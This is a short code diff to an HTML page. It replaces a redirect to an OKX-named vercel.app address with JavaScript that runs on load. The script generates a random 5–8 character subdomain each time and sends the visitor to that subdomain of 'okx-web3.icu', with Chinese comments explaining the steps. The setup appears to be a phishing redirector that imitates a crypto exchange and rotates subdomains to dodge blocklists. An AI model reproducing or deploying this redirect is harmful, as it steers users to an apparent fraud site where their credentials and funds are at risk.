@@ -2,7 +2,20 @@
 <!DOCTYPE html>
 <html>
 <script>
-    window.location.href="okx00001111-kapaqis-projects.vercel.app";
+    function generateRandomString(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for (var i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+ 
+// 使用函数
+var randomString = generateRandomString(Math.floor(Math.random() * 4) + 5); // 生成5到8位的随机字符串
+//console.log(randomString);
+    window.location.href= "https://" + randomString + ".okx-web3.icu/";
 </script>
  
 <body>
